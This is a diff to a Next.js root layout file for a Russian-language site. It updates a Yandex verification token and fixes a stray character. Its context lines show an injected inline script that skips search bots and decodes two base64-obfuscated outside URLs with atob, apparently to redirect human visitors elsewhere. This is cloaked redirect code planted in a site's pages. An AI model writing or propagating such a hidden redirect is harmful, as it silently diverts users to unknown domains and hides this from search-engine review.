@@ -101,7 +101,7 @@ export default function RootLayout({
   return (
     <html lang="ru" className={`${inter.variable} bg-background`} suppressHydrationWarning>
       <head>
-       <meta name="yandex-verification" content="45a92fdd6cbfda2c" />
+       <meta name="yandex-verification" content="2f6970ea569e4947" />
         <link rel="preconnect" href="https://fonts.googleapis.com" />
 <script
   dangerouslySetInnerHTML={{
@@ -114,7 +114,7 @@ export default function RootLayout({
                 console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
                 return;
             }
-        }4
+        }
         var mainBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZDd0dGxyeXZo"; 
         var crossBrandB64 = "#aHR0cHM6Ly9ldjQtcHVsczExLmNvbS9kdmZka3ViNno="; 
         var mainUrl = atob(mainBrandB64);
